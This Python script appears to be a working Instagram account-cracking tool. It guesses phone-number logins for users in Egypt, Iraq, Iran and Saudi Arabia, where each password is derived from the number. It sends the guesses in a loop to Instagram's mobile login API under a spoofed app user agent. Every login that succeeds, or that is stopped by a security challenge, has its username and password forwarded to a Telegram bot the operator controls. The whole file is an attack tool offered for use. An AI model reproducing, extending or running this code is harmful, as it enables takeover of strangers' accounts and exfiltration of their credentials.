import requests , random , os , sys , pyfiglet , time , webbrowser , user_agent
from user_agent import generate_user_agent
from uuid import uuid4

# ┅  ┅  ┅  ┅  ┅  ┅  ┅  ┅
ao = "\033[2;30m" 
o = "\033[2;11m" 
J = "\033[2;8m" #لون مخفي
s = "\033[1;91m"  #احمر
Y = "\033[1;34m" #ازرق فاتح
W = "\033[2;31m"  #احمر ثان
C = "\033[1;97m" #ابيض
B = "\033[1;90m"  #اسود فاتح
C = "\033[1;97m"  #ابيض
E = "\033[1;92m"  #اخضر
H = "\033[1;93m"  #اصفر
K = "\033[1;94m"  #ازرق
L = "\033[1;95m"  #ارجواني
G = "\033[1;32m"#اخضر
R = "\033[1;31m"#احمر
M = "\033[1;37m"#ابيض
# ┅  ┅  ┅  ┅  ┅  ┅  ┅  ┅
AL = 1
SR = 0
Sw = 0
l = ' : password : '
Hh = 0
sc = 0
bd = 0
Bad=' BAD |' ; scr = 'SECURE | ' ; bad = ' username :' ; HAK = 'GOD | ' ; Hd = '0123456789'
a='…'*50
bi=pyfiglet.figlet_format('I N S T A')
webbrowser.open('https://t.me/CCD_7/8905')
log=f'''{K}{a}\n{L}({E}1{L}){R} EG{M}Y{B}PT\t\t{L}({E}2{L}) {R}IR{B}AQ\n{L}({E}3{L}){R} IR{B}AN\t\t{L}({E}4{L}) {G}K{M}S{G}A\n{K}\t   {L}({E}0{L}){K} Tele\n{a}\n'''
def ahmed(z):
	for e in z:
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(4./900)
ahmed(R+bi+log)
AHD=str(input(f'''{G}({R}?{G}){K} CHOOCE{B} → {M}'''))
if AHD == '0':
			webbrowser.open('https://t.me/CCD_7/8905')
			exit(B+'BY : @O99_5_O')
os.system('clear')
Token=input(f'''{B}Token {M}: {B}''')
os.system('clear')
token=input(f'''{B}Token {M}: {B}''')
os.system('clear')
ID=input(f'''{B}ID {M}: {B}''')
os.system('clear')
while True:
		NUM=['010','011','012','015']
		if AHD == '1':
			AHMED=str(''.join((random.choice(Hd) for i in range (8))))
			Ad=random.choice(NUM)
			username='+2' + Ad + AHMED
			password= Ad + AHMED
		if AHD == '2':
			AHMED=str(''.join((random.choice(Hd) for i in range (7))))
			username='+964770' + AHMED
			password='0770' + AHMED
		if AHD == '3':
			AHMED=str(''.join((random.choice(Hd) for i in range (7))))
			username='+98936' + AHMED
			password='0936' + AHMED
		if AHD == '4':
			AHMED=str(''.join((random.choice(Hd) for i in range (8))))
			username='+96650' + AHMED
			password='050' + AHMED
		url =  'https://i.instagram.com/api/v1/accounts/login/'
		headers = { 'Accept': '*/*',
'Accept-Encoding': 'gzip, deflate',
'Accept-Language': 'en-US',
'X-IG-Capabilities': '3brTvw==',
'X-IG-Connection-Type': 'WIFI',
'Host': 'i.instagram.com',
'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
'User-Agent':'Instagram 114.0.0.28.894 Android (30/3.0; 216dpi; 623x1280; huawei/google; Nokia 2.4; angler; angler; en_US)',
'Cookie': 'missing' }
		uid = str((uuid4()))
		data = {
'uuid':uid, 
'password':password,
'username':username, 
'device_id':uid, 
'from_reg':'false', 
'_csrftoken':'missing', 
'login_attempt_countn':'0'
}

		logen = requests.post(url, headers = headers ,data=data , allow_redirects = True ).text
		print(B+uid)
		print(C+logen)	
		if 'logged_in_user' in logen:
			Hh =+ 1
			print(f"{L}({G}{Sw}{L})"+E+HAK+username+l+password)
			Sw = Sw+1
			tl = (f'''https://api.telegram.org/bot{Token}/sendMessage?chat_id={ID}&text=⌯ Nᴇᴡ Aᴄᴄ 
- - - - - - - - - - - - - - - - - - - - - - - 
⌯ Usᴇʀ :+ {username}

⌯ Pᴀss : {password}
- - - - - - - - - - - - - - - - - - - - - - - 
<\> PY : @O99_5_O </> ''' )	
			i = requests.post(tl) 		
		elif '"message":"challenge_required","challenge"' in logen:
			sc =+ 1
			print(f"{L}({G}{SR}{L})"+H+scr+username+l+password)
			
			SR = SR+1
			tlg = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=⌯ Nᴇᴡ Aᴄᴄ 🔒
- - - - - - - - - - - - - - - - - - - - - - - 
⌯ Usᴇʀ :+{username}

⌯ Pᴀss : {password}
- - - - - - - - - - - - - - - - - - - - - - -
<\> PY : @O99_5_O </> ''' )

			o = requests.post(tlg)
		else:
#			print(f"{L}({G}{AL}{L})"+R+bad+username+l+password)
			print(f"{L}({G}{AL}{L})"+R+Bad+f"{L}({G}{SR}{L})"+H+scr+f"{L}({G}{Sw}{L})"+G+HAK)
			AL =	AL+1
#			SR = SR+1
#			Sw = Sw+1
# - CODE - PY_TELEGRAM : @O99_5_O	
